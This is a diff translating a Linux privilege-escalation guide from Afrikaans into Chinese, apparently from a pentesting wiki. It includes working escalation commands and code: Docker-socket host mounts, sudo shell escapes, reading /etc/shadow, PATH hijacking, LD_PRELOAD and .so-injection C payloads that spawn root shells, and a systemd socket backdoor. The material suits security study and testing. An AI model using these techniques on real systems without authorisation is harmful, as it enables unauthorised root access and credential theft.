+* 找到某个 systemd 单元，该单元正在 **执行一个相对路径**，并且您对 **systemd PATH** 具有 **可写权限**（以冒充该可执行文件）
 
-**Leer meer oor timers met `man systemd.timer`.**
+**通过 `man systemd.timer` 了解更多关于计时器的信息。**
 
-### **Timer Aktivering**
+### **启用计时器**
 
-Om 'n timer te aktiveer, het jy wortelregte nodig en om uit te voer:
+要启用计时器，您需要 root 权限并执行：
 ```bash
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
-Note dat die **timer** geaktiveer word deur 'n symlink na dit te skep op `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+注意 **timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个符号链接来 **激活** 的。
 
 ## Sockets
 
-Unix Domain Sockets (UDS) stel **proses kommunikasie** in staat op dieselfde of verskillende masjiene binne kliënt-bediener modelle. Hulle gebruik standaard Unix beskrywer lêers vir inter-rekenaar kommunikasie en word opgestel deur middel van `.socket` lêers.
+Unix 域套接字 (UDS) 使得在客户端-服务器模型中同一台或不同机器上的 **进程通信** 成为可能。它们利用标准的 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行设置。
 
-Sockets kan gekonfigureer word met behulp van `.socket` lêers.
+可以使用 `.socket` 文件配置套接字。
 
-**Leer meer oor sockets met `man systemd.socket`.** Binne hierdie lêer kan verskeie interessante parameters gekonfigureer word:
+**通过 `man systemd.socket` 了解更多关于套接字的信息。** 在此文件中，可以配置几个有趣的参数：
 
-* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies is verskillend, maar 'n opsomming word gebruik om **aan te dui waar dit gaan luister** na die socket (die pad van die AF\_UNIX socket lêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
-* `Accept`: Neem 'n booleaanse argument. As **waar**, 'n **diensinstansie word geskep vir elke inkomende verbinding** en slegs die verbinding socket word aan dit oorgedra. As **vals**, word al die luister sockets self **aan die begin diens eenheid oorgedra**, en slegs een diens eenheid word geskep vir al die verbindings. Hierdie waarde word geïgnoreer vir datagram sockets en FIFOs waar 'n enkele diens eenheid onvoorwaardelik al die inkomende verkeer hanteer. **Standaard is vals**. Vir prestasiedoeleindes word dit aanbeveel om nuwe daemons slegs op 'n manier te skryf wat geskik is vir `Accept=no`.
-* `ExecStartPre`, `ExecStartPost`: Neem een of meer opdraglyne, wat **uitgevoer word voor** of **na** die luister **sockets**/FIFOs **gecreëer** en gebind word, onderskeidelik. Die eerste token van die opdraglyn moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
-* `ExecStopPre`, `ExecStopPost`: Bykomende **opdragte** wat **uitgevoer word voor** of **na** die luister **sockets**/FIFOs **gesluit** en verwyder word, onderskeidelik.
-* `Service`: Gee die **diens** eenheid naam **om te aktiveer** op **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met Accept=no. Dit is standaard die diens wat dieselfde naam as die socket dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.
+* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项不同，但总结起来是 **指示将要监听** 套接字的位置（AF_UNIX 套接字文件的路径，监听的 IPv4/6 和/或端口号等）
+* `Accept`: 接受一个布尔参数。如果 **true**，则 **为每个传入连接生成一个服务实例**，并且仅将连接套接字传递给它。如果 **false**，则所有监听套接字本身都被 **传递给启动的服务单元**，并且所有连接仅生成一个服务单元。对于数据报套接字和 FIFO，此值被忽略，因为单个服务单元无条件处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适合 `Accept=no` 的方式编写新的守护进程。
+* `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令在监听 **套接字**/FIFO 被 **创建** 和绑定之前或之后 **执行**。命令行的第一个标记必须是绝对文件名，后面跟随进程的参数。
+* `ExecStopPre`, `ExecStopPost`: 在监听 **套接字**/FIFO 被 **关闭** 和移除之前或之后 **执行** 的额外 **命令**。
+* `Service`: 指定 **在传入流量上激活的** **服务** 单元名称。此设置仅允许用于 Accept=no 的套接字。默认为与套接字同名的服务（后缀被替换）。在大多数情况下，不需要使用此选项。
 
-### Skryfbare .socket lêers
+### 可写的 .socket 文件
 
-As jy 'n **skryfbare** `.socket` lêer vind, kan jy **byvoeg** aan die begin van die `[Socket]` afdeling iets soos: `ExecStartPre=/home/kali/sys/backdoor` en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom, jy sal **waarskynlik moet wag totdat die masjien herbegin word.**\
-&#xNAN;_&#x4E;ote dat die stelsel daardie socket lêer konfigurasie moet gebruik of die backdoor sal nie uitgevoer word nie_
+如果您发现一个 **可写** 的 `.socket` 文件，您可以在 `[Socket]` 部分的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，后门将在套接字创建之前执行。因此，您 **可能需要等到机器重启。**\
+&#xNAN;_&#x4E;注意系统必须使用该套接字文件配置，否则后门将不会被执行_
 
-### Skryfbare sockets
+### 可写套接字
 
-As jy **enige skryfbare socket identifiseer** (_nou praat ons oor Unix Sockets en nie oor die konfig `.socket` lêers nie_), dan **kan jy kommunikeer** met daardie socket en dalk 'n kwesbaarheid benut.
+如果您 **识别到任何可写套接字**（_现在我们谈论的是 Unix 套接字，而不是配置 `.socket` 文件_），那么 **您可以与该套接字进行通信**，并可能利用一个漏洞。
 
-### Enumereer Unix Sockets
+### 枚举 Unix 套接字
 ```bash
 netstat -a -p --unix
 ```
-### Roue verbinding
+### 原始连接
 ```bash
 #apt-get install netcat-openbsd
 nc -U /tmp/socket  #Connect to UNIX-domain stream socket
@@ -493,54 +495,54 @@ nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
 #apt-get install socat
 socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
 ```
-**Eksploitering voorbeeld:**
+**利用示例：**
 
 {% content-ref url="socket-command-injection.md" %}
 [socket-command-injection.md](socket-command-injection.md)
 {% endcontent-ref %}
 
-### HTTP sokke
+### HTTP 套接字
 
-Let daarop dat daar dalk **sokke is wat luister na HTTP** versoeke (_Ek praat nie van .socket lêers nie, maar die lêers wat as unix sokke optree_). Jy kan dit nagaan met:
+请注意，可能有一些 **监听 HTTP** 请求的 **套接字**（_我不是在谈论 .socket 文件，而是作为 unix 套接字的文件_）。您可以通过以下方式检查：
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
-As die socket **reageer met 'n HTTP** versoek, kan jy **kommunikeer** daarmee en dalk **'n sekuriteitskwessie** benut.
+如果套接字 **以 HTTP** 请求响应，则您可以 **与其通信**，并可能 **利用某些漏洞**。
 
-### Skryfbare Docker Socket
+### 可写的 Docker 套接字
 
-Die Docker socket, wat dikwels by `/var/run/docker.sock` gevind word, is 'n kritieke lêer wat beveilig moet word. Standaard is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Om skryfrechten tot hierdie socket te hê, kan lei tot privilige-eskalasie. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.
+Docker 套接字，通常位于 `/var/run/docker.sock`，是一个关键文件，应该被保护。默认情况下，它对 `root` 用户和 `docker` 组的成员是可写的。拥有对该套接字的写访问权限可能导致特权升级。以下是如何做到这一点的详细说明，以及在 Docker CLI 不可用时的替代方法。
 
-#### **Privilige Eskalasie met Docker CLI**
+#### **使用 Docker CLI 进行特权升级**
 
-As jy skryfrechten tot die Docker socket het, kan jy privilige eskalasie doen met die volgende opdragte:
+如果您对 Docker 套接字具有写访问权限，可以使用以下命令进行特权升级：
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
-These commands allow you to run a container with root-level access to the host's file system.
+这些命令允许您以根级别访问主机的文件系统运行容器。
 
-#### **Gebruik Docker API Direk**
+#### **直接使用 Docker API**
 
-In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker-soket steeds gemanipuleer word met behulp van die Docker API en `curl` opdragte.
+在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令操作 Docker 套接字。
 
-1.  **Lys Docker Beelde:** Verkry die lys van beskikbare beelde.
+1.  **列出 Docker 镜像：** 检索可用镜像的列表。
 
 ```bash
 curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
-2.  **Skep 'n Houer:** Stuur 'n versoek om 'n houer te skep wat die gasheer se wortelgids monteer.
+2.  **创建容器：** 发送请求以创建一个挂载主机系统根目录的容器。
 
 ```bash
 curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
 ```
 
-Begin die nuutgeskepte houer:
+启动新创建的容器：
 
 ```bash
 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
 ```
-3.  **Koppel aan die Houer:** Gebruik `socat` om 'n verbinding met die houer te vestig, wat opdraguitvoering binne dit moontlik maak.
+3.  **附加到容器：** 使用 `socat` 建立与容器的连接，从而在其中执行命令。
 
 ```bash
 socat - UNIX-CONNECT:/var/run/docker.sock
@@ -550,29 +552,29 @@ Connection: Upgrade
 Upgrade: tcp
 ```
 
-Na die opstelling van die `socat` verbinding, kan jy opdragte direk in die houer uitvoer met wortelvlak toegang tot die gasheer se lêerstelsel.
+在设置好 `socat` 连接后，您可以直接在容器中执行命令，具有对主机文件系统的根级别访问权限。
 
-### Ander
+### 其他
 
-Let daarop dat as jy skrywe toestemmings oor die docker soket het omdat jy **binne die groep `docker`** is, jy het [**meer maniere om voorregte te verhoog**](interesting-groups-linux-pe/#docker-group). As die [**docker API op 'n poort luister** kan jy dit ook kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+请注意，如果您对 Docker 套接字具有写权限，因为您**在 `docker` 组内**，您有[**更多的权限提升方式**](interesting-groups-linux-pe/#docker-group)。如果[**docker API 在某个端口上监听**，您也可以妥协它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。
 
-Kyk na **meer maniere om uit docker te breek of dit te misbruik om voorregte te verhoog** in:
+查看**更多从 docker 中突破或滥用它以提升权限的方法**：
 
 {% content-ref url="docker-security/" %}
 [docker-security](docker-security/)
 {% endcontent-ref %}
 
-## Containerd (ctr) voorregverhoging
+## Containerd (ctr) 权限提升
 
-As jy vind dat jy die **`ctr`** opdrag kan gebruik, lees die volgende bladsy as **jy dalk in staat mag wees om dit te misbruik om voorregte te verhoog**:
+如果您发现可以使用 **`ctr`** 命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：
 
 {% content-ref url="containerd-ctr-privilege-escalation.md" %}
 [containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
 {% endcontent-ref %}
 
-## **RunC** voorregverhoging
+## **RunC** 权限提升
 
-As jy vind dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy as **jy dalk in staat mag wees om dit te misbruik om voorregte te verhoog**:
+如果您发现可以使用 **`runc`** 命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：
 
 {% content-ref url="runc-privilege-escalation.md" %}
 [runc-privilege-escalation.md](runc-privilege-escalation.md)
@@ -580,15 +582,15 @@ As jy vind dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy as
 
 ## **D-Bus**
 
-D-Bus is 'n gesofistikeerde **inter-Process Communication (IPC) stelsel** wat toepassings in staat stel om doeltreffend te kommunikeer en data te deel. Ontwerp met die moderne Linux-stelsel in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.
+D-Bus 是一个复杂的 **进程间通信 (IPC) 系统**，使应用程序能够高效地交互和共享数据。它是为现代 Linux 系统设计的，提供了一个强大的框架，用于不同形式的应用程序通信。
 
-Die stelsel is veelsydig, wat basiese IPC ondersteun wat data-uitruil tussen prosesse verbeter, wat herinner aan **verbeterde UNIX-domein sokke**. Boonop help dit om gebeurtenisse of seine te versprei, wat naatlose integrasie tussen stelseldelers bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler aanmoedig om te demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n afstandsobjekstelsel, wat diensversoeke en metode-aanroep tussen toepassings vereenvoudig, wat prosesse stroomlyn wat tradisioneel kompleks was.
+该系统灵活多变，支持基本的 IPC，增强了进程之间的数据交换，类似于 **增强的 UNIX 域套接字**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自蓝牙守护进程的关于来电的信号可以促使音乐播放器静音，从而增强用户体验。此外，D-Bus 支持远程对象系统，简化了应用程序之间的服务请求和方法调用，简化了传统上复杂的过程。
 
-D-Bus werk op 'n **toelaat/weier model**, wat boodskaptoestemmings (metode-aanroepe, seinuitstoot, ens.) bestuur op grond van die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleide spesifiseer interaksies met die bus, wat moontlik voorregverhoging deur die uitbuiting van hierdie toestemmings toelaat.
+D-Bus 基于 **允许/拒绝模型**，根据匹配的策略规则的累积效果管理消息权限（方法调用、信号发射等）。这些策略指定与总线的交互，可能通过利用这些权限来允许权限提升。
 
-'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat toestemmings vir die wortelgebruiker om te besit, te stuur na, en boodskappe van `fi.w1.wpa_supplicant1` te ontvang, uiteensit.
+在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了这样一个策略的示例，详细说明了根用户拥有、发送和接收来自 `fi.w1.wpa_supplicant1` 消息的权限。
 
-Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "standaard" kontekstbeleide op almal van toepassing is wat nie deur ander spesifieke beleide gedek word nie.
+没有指定用户或组的策略适用于所有情况，而“默认”上下文策略适用于所有未被其他特定策略覆盖的情况。
 ```xml
 <policy user="root">
 <allow own="fi.w1.wpa_supplicant1"/>
@@ -597,17 +599,17 @@ Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "st
 <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
 </policy>
 ```
-**Leer hoe om 'n D-Bus kommunikasie te enumerate en te benut hier:**
+**了解如何枚举和利用 D-Bus 通信：**
 
 {% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
 [d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
 {% endcontent-ref %}
 
-## **Netwerk**
+## **网络**
 
-Dit is altyd interessant om die netwerk te enumerate en die posisie van die masjien uit te vind.
+枚举网络并确定机器的位置总是很有趣。
 
-### Generiese enumerasie
+### 通用枚举
 ```bash
 #Hostname, hosts and DNS
 cat /etc/hostname /etc/hosts /etc/resolv.conf
@@ -632,22 +634,22 @@ lsof -i
 ```
 ### Open ports
 
-Kontroleer altyd netwerkdienste wat op die masjien loop waarmee jy nie kon interaksie hê nie voordat jy dit toeganklik gemaak het:
+始终检查在您无法与之交互的机器上运行的网络服务：
 ```bash
 (netstat -punta || ss --ntpu)
 (netstat -punta || ss --ntpu) | grep "127.0"
 ```
 ### Sniffing
 
-Kontroleer of jy verkeer kan snuffel. As jy kan, kan jy dalk 'n paar geloofsbriewe gryp.
+检查您是否可以嗅探流量。如果可以，您可能能够获取一些凭据。
 ```
 timeout 1 tcpdump
 ```
-## Users
+## 用户
 
-### Generic Enumeration
+### 通用枚举
 
-Kontroleer **wie** jy is, watter **privileges** jy het, watter **users** in die stelsels is, watter kan **login** en watter het **root privileges:**
+检查 **who** 你是，拥有的 **privileges**，系统中有哪些 **users**，哪些可以 **login**，哪些具有 **root privileges**：
 ```bash
 #Info about me
 id || (whoami && groups) 2>/dev/null
@@ -671,12 +673,12 @@ gpg --list-keys 2>/dev/null
 ```
 ### Big UID
 
-Sommige Linux weergawes was geraak deur 'n fout wat gebruikers met **UID > INT\_MAX** toelaat om voorregte te verhoog. Meer inligting: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
-**Eksploiteer dit** met: **`systemd-run -t /bin/bash`**
+某些Linux版本受到一个漏洞的影响，允许**UID > INT\_MAX**的用户提升权限。更多信息：[这里](https://gitlab.freedesktop.org/polkit/polkit/issues/74)，[这里](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)和[这里](https://twitter.com/paragonsec/status/1071152249529884674)。\
+**利用它**使用：**`systemd-run -t /bin/bash`**
 
 ### Groups
 
-Kyk of jy 'n **lid van 'n groep** is wat jou root voorregte kan gee:
+检查您是否是某个可能授予您root权限的**组的成员**：
 
 {% content-ref url="interesting-groups-linux-pe/" %}
 [interesting-groups-linux-pe](interesting-groups-linux-pe/)
@@ -684,7 +686,7 @@ Kyk of jy 'n **lid van 'n groep** is wat jou root voorregte kan gee:
 
 ### Clipboard
 
-Kyk of daar iets interessant in die klembord is (indien moontlik)
+检查剪贴板中是否有任何有趣的内容（如果可能的话）
 ```bash
 if [ `which xclip 2>/dev/null` ]; then
 echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
@@ -695,33 +697,33 @@ echo "Highlighted text: "`xsel -o 2>/dev/null`
 else echo "Not found xsel and xclip"
 fi
 ```
-### Wagwoordbeleid
+### 密码策略
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
-### Bekende wagwoorde
+### 已知密码
 
-As jy **enige wagwoord** van die omgewing **ken, probeer om in te log as elke gebruiker** met die wagwoord.
+如果你**知道环境中的任何密码**，请尝试使用该密码**登录每个用户**。
 
 ### Su Brute
 
-As jy nie omgee om baie geraas te maak nie en `su` en `timeout` binaire is op die rekenaar teenwoordig, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
-[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.
+如果你不介意制造很多噪音，并且计算机上存在`su`和`timeout`二进制文件，你可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)进行暴力破解用户。\
+[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用`-a`参数也会尝试暴力破解用户。
 
-## Skryfbare PAD misbruik
+## 可写的 PATH 滥用
 
 ### $PATH
 
-As jy vind dat jy **binne 'n sekere gids van die $PATH kan skryf**, mag jy in staat wees om voorregte te verhoog deur **'n agterdeur binne die skryfbare gids te skep** met die naam van 'n opdrag wat deur 'n ander gebruiker (root idealiter) uitgevoer gaan word en wat **nie gelaai word vanaf 'n gids wat voor jou skryfbare gids in $PATH geleë is nie**.
+如果你发现可以**在 $PATH 的某个文件夹内写入**，你可能能够通过**在可写文件夹内创建一个后门**，其名称为将由其他用户（理想情况下是 root）执行的某个命令，并且该命令**不是从位于你的可写文件夹之前的文件夹加载**的，从而提升权限。
 
-### SUDO en SUID
+### SUDO 和 SUID
 
-Jy mag toegelaat word om 'n sekere opdrag met sudo uit te voer of hulle mag die suid-bietjie hê. Kontroleer dit met:
+你可能被允许使用 sudo 执行某些命令，或者它们可能具有 suid 位。使用以下命令检查：
 ```bash
 sudo -l #Check commands you can execute with sudo
 find / -perm -4000 2>/dev/null #Find all SUID binaries
 ```
-Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs 'n opdrag uit te voer.** Byvoorbeeld:
+一些**意外的命令允许您读取和/或写入文件，甚至执行命令。** 例如：
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find /etc -exec sh -i \;
@@ -732,31 +734,31 @@ less>! <shell_comand>
 ```
 ### NOPASSWD
 
-Sudo-konfigurasie mag 'n gebruiker toelaat om 'n opdrag met 'n ander gebruiker se voorregte uit te voer sonder om die wagwoord te ken.
+Sudo 配置可能允许用户在不知道密码的情况下以其他用户的权限执行某些命令。
 ```
 $ sudo -l
 User demo may run the following commands on crashlab:
 (root) NOPASSWD: /usr/bin/vim
 ```
-In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer, dit is nou triviaal om 'n shell te verkry deur 'n ssh-sleutel in die root-gids by te voeg of deur `sh` aan te roep.
+在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh 密钥添加到根目录或调用 `sh` 来获取 shell 变得微不足道。
 ```
 sudo vim -c '!sh'
 ```
 ### SETENV
 
-Hierdie riglyn laat die gebruiker toe om 'n **omgewing veranderlike** in te stel terwyl iets uitgevoer word:
+此指令允许用户在执行某些操作时**设置环境变量**：
 ```bash
 $ sudo -l
 User waldo may run the following commands on admirer:
 (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
-Hierdie voorbeeld, **gebaseer op HTB-masjien Admirer**, was **kwulnerbaar** vir **PYTHONPATH-hijacking** om 'n arbitrêre python-biblioteek te laai terwyl die skrip as root uitgevoer word:
+这个例子，**基于 HTB 机器 Admirer**，**易受** **PYTHONPATH 劫持** 的影响，在以 root 身份执行脚本时加载任意 python 库：
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
-### Sudo uitvoering omseil pad
+### Sudo 执行绕过路径
 
-**Spring** om ander lêers te lees of gebruik **simboliese skakels**. Byvoorbeeld in die sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/\*_
+**跳转** 以读取其他文件或使用 **符号链接**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
 ```bash
 sudo less /var/logs/anything
 less>:e /etc/shadow #Jump to read other files using privileged less
@@ -766,50 +768,50 @@ less>:e /etc/shadow #Jump to read other files using privileged less
 ln /etc/shadow /var/log/new
 sudo less /var/log/new #Use symlinks to read any file
 ```
-As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
+如果使用 **wildcard** (\*)，则更容易：
 ```bash
 sudo less /var/log/../../etc/shadow #Read shadow
 sudo less /var/log/something /etc/shadow #Red 2 files
 ```
-**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
+**对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
-### Sudo-opdrag/SUID-binary sonder opdragspad
+### 没有命令路径的 Sudo 命令/SUID 二进制文件
 
-As die **sudo toestemming** aan 'n enkele opdrag gegee word **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit benut deur die PATH veranderlike te verander.
+如果 **sudo 权限** 被授予单个命令 **而不指定路径**: _hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
 sudo less
 ```
-Hierdie tegniek kan ook gebruik word as 'n **suid** binêre **'n ander opdrag uitvoer sonder om die pad daarna te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binêre)**.
+这种技术也可以在**suid**二进制文件**执行另一个命令而不指定路径时使用（始终使用**_**strings**_**检查奇怪的SUID二进制文件的内容）**。
 
-[Payload voorbeelde om uit te voer.](payloads-to-execute.md)
+[执行的有效载荷示例。](payloads-to-execute.md)
 
-### SUID binêre met opdrag pad
+### 带命令路径的SUID二进制文件
 
-As die **suid** binêre **'n ander opdrag uitvoer wat die pad spesifiseer**, kan jy probeer om 'n **funksie** te **eksporteer** wat dieselfde naam het as die opdrag wat die suid-lêer aanroep.
+如果**suid**二进制文件**执行另一个命令并指定路径**，那么你可以尝试**导出一个名为该suid文件调用的命令的函数**。
 
-Byvoorbeeld, as 'n suid binêre _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en dit te eksporteer:
+例如，如果一个suid二进制文件调用_**/usr/sbin/service apache2 start**_，你必须尝试创建该函数并导出它：
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
-Then, when you call the suid binary, this function will be executed
+然后，当你调用suid二进制文件时，这个函数将被执行
 
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
-Die **LD\_PRELOAD** omgewing veranderlike word gebruik om een of meer gedeelde biblioteke (.so lêers) aan te dui wat deur die laaier gelaai moet word voordat alle ander, insluitend die standaard C biblioteek (`libc.so`). Hierdie proses staan bekend as die vooraflaai van 'n biblioteek.
+**LD\_PRELOAD**环境变量用于指定一个或多个共享库（.so文件），这些库将在加载器加载所有其他库之前被加载，包括标准C库（`libc.so`）。这个过程被称为预加载库。
 
-Om egter die stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, handhaaf die stelsel sekere voorwaardes:
+然而，为了维护系统安全并防止此功能被利用，特别是在**suid/sgid**可执行文件中，系统强制执行某些条件：
 
-* Die laaier ignoreer **LD\_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_).
-* Vir uitvoerbare lêers met suid/sgid, word slegs biblioteke in standaardpaaie wat ook suid/sgid is, vooraf gelaai.
+* 加载器忽略**LD\_PRELOAD**对于真实用户ID（_ruid_）与有效用户ID（_euid_）不匹配的可执行文件。
+* 对于具有suid/sgid的可执行文件，仅在标准路径中且也具有suid/sgid的库会被预加载。
 
-Privilegie-eskalasie kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitvoer van `sudo -l` die stelling **env\_keep+=LD\_PRELOAD** insluit. Hierdie konfigurasie laat die **LD\_PRELOAD** omgewing veranderlike toe om te bly en erken te word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van arbitrêre kode met verhoogde bevoegdhede.
+如果你有能力使用`sudo`执行命令，并且`sudo -l`的输出包含语句**env\_keep+=LD\_PRELOAD**，则可能发生权限提升。这种配置允许**LD\_PRELOAD**环境变量持续存在并被识别，即使在使用`sudo`运行命令时，也可能导致以提升的权限执行任意代码。
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
-Berg as **/tmp/pe.c**
+保存为 **/tmp/pe.c**
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -822,17 +824,17 @@ setuid(0);
 system("/bin/bash");
 }
 ```
-Dan **kompyleer dit** met:
+然后 **编译它** 使用：
 ```bash
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-Uiteindelik, **verhoog privaathede** wat loop
+最后，**提升权限** 运行
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 {% hint style="danger" %}
-'n Soortgelyke privesc kan misbruik word as die aanvaller die **LD\_LIBRARY\_PATH** omgewing veranderlike beheer, omdat hy die pad beheer waar biblioteke gesoek gaan word.
+如果攻击者控制了 **LD\_LIBRARY\_PATH** 环境变量，则可以滥用类似的权限提升，因为他控制了将要搜索库的路径。
 {% endhint %}
 ```c
 #include <stdio.h>
@@ -853,15 +855,15 @@ cd /tmp
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
-### SUID Binêre – .so inspuiting
+### SUID 二进制文件 – .so 注入
 
-Wanneer jy 'n binêre met **SUID** regte teëkom wat ongewoon lyk, is dit 'n goeie praktyk om te verifieer of dit **.so** lêers korrek laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
+当遇到一个具有 **SUID** 权限且看起来不寻常的二进制文件时，验证它是否正确加载 **.so** 文件是一个好习惯。可以通过运行以下命令来检查：
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
-Byvoorbeeld, om 'n fout soos _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Geen sodanige lêer of gids)"_ te teëkom, dui op 'n potensiaal vir uitbuiting.
+例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (没有这样的文件或目录)"_ 的错误提示，暗示了潜在的利用可能性。
 
-Om dit te benut, sou 'n mens voortgaan deur 'n C-lêer te skep, sê _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
+为了利用这一点，可以创建一个 C 文件，比如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -872,15 +874,15 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Hierdie kode, wanneer dit gecompileer en uitgevoer word, is daarop gemik om voorregte te verhoog deur lêer toestemmings te manipuleer en 'n skulp met verhoogde voorregte uit te voer.
+此代码在编译和执行后，旨在通过操纵文件权限并执行具有提升权限的 shell 来提升权限。
 
-Compileer die bogenoemde C-lêer in 'n gedeelde objek (.so) lêer met:
